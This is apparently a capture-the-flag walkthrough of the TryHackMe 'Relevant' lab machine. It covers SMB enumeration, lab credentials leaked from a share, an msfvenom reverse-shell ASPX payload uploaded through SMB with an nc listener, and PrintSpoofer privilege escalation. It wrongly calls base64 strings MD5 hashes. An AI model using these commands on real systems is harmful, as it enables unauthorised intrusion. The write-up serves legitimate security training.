---
title: TryHackMe - Relevant Room Walkthrough
author: skullhat
date: '2023-06-17 00:34:00 +0800'
comments: true
categories:
  - thm
  - ctf
tags:
  - windows
  - active_directory
published: true
---
## Scope:

- The client has asked that you secure two flags (no location provided) as proof of exploitation:
	- User.txt
	- Root.txt
- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

## Basic OS Detection

Before diving into any further analysis, it's essential to initiate a preliminary assessment by running a simple ping command on the target host. This initial step can provide valuable information about the host's operating system and network characteristics. Pay close attention to the Time to Live (TTL) value, as it often reveals details about the host's underlying OS.

```bash
ping -c 1 10.10.97.109
PING 10.10.97.109 (10.10.97.109) 56(84) bytes of data.
64 bytes from 10.10.97.109: icmp_seq=1 ttl=127 time=285 ms
```


Based on the basic OS detection performed, it's likely that the target machine is running a Windows operating system. The TTL value by default is 128 in Windows machines.

## Enumeration using `nmap`

Running nmap with -sC for default scripts, -sV enumerate version of every running service, -T4 is running script faster, -vvv to show me all the open ports as it is found and -oA for outputing all formats in case I want to pass it to another tool.

```bash
nmap -sCV -O -T4 -vvv -oA nmap/relevent 10.10.97.109
```
### Port Scan Results: The scan identified several open ports on the host:

- Port 80/tcp: Open, running Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) with various HTTP methods supported. The web server is likely running on Windows Server and presents itself as "IIS Windows Server."

- Port 135/tcp: Open, running Microsoft Windows RPC.

- Port 139/tcp: Open, running Microsoft Windows netbios-ssn.

- Port 445/tcp: Open, running Windows Server 2016 Standard Evaluation 14393 with the service "microsoft-ds."

- Port 3389/tcp: Open, possibly running ms-wbt-server. An SSL certificate is present with the commonName "Relevant."

### Operating System Detection: 
The scan provides an educated guess about the host's operating system, suggesting it is likely running Microsoft Windows 2016, 2012, or 2008. However, it notes that the OS fingerprint is not ideal due to a missing closed TCP port.

## SMB:445
### Try Gust Authentication
- Try null authentication, but getting nothing. Based on nmap output the `gust` account can access the shares.

```bash
crackmapexec smb 10.10.97.109 -u "" -p "" --shares
```

- When trying `gust` has juicy folder called nt4wrksv with read and write permissions.

```bash
crackmapexec smb 10.10.97.109 -u "gust" -p "" --shares

```
![CME](/assets/img/uploads/20230614185247.png)

- Found `passowrds.txt` then create smb directory and move it there.

``` bash
crackmapexec smb 10.10.176.144 -u "gust" -p "" -M spider_plus
smbclient //10.10.176.144/nt4wrksv -U ""
```
- The users passwords was MD5 hashed.

> The Hash
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

> The Plain Text
Bob:!P@$$W0rD!123
Bill:Juw4nnaM4n420696969!$$$                                          

## Getting a shell

1. Try bill account on `evil-winrm` and can not access. Also try on RDP and failed. So it must be fake!
2. found that port 49663 has also a web server and run `gobsuter` to enumerate directories and found one with same `smb` share name! 

- http://10.10.247.115:49663/nt4wrksv/shell.aspx


``` bash
msfvenom -p windows/x64/shell_reverse_tcp LPORT=9001 LHOST=10.9.78.51  -f aspx -o shell.aspx 
smbclient //10.10.247.115/nt4wrksv -U 'bob'
smb: \> put shell.aspx
sudo rlwrap nc -lnvp 9001
```

## Local Enumeration 

``` powershell
whoami /all
systeminfo
```

![Privilages](/assets/img/uploads/20230614214734.png)

## PrivEsc

While investigation, I've uncovered the presence of the powerful `SeImpersonatePrivilege`. This privilege opens up an opportunity to leverage a tool called [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0), which takes advantage of Impersonation Privileges. Specifically, it exploits the `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019, allowing for a privilege escalation from LOCAL/NETWORK SERVICE to SYSTEM-level access. This discovery sheds light on a significant security vulnerability within these Windows systems.

![Privilages_is_500](/assets/img/uploads/20230614224001.png)

In the realm of cybersecurity, vigilance is paramount, and it's reassuring to know that your Antivirus (AV) has successfully identified and thwarted a potentially harmful "Potatoes attack." However, as we navigate the intricate landscape of security testing and ethical hacking, occasional roadblocks can arise. Currently, in the world of Kali Linux, there's a particular challenge hindering the execution of the EternalBlue MS17-010 exploit. This exploit, notorious for its role in significant cyber incidents, relies on a specific set of conditions to work effectively. Identifying and overcoming these obstacles is a crucial aspect of the cybersecurity journey, ensuring that we are always prepared to address both detected threats and technical hurdles in our pursuit of a safer digital environment.
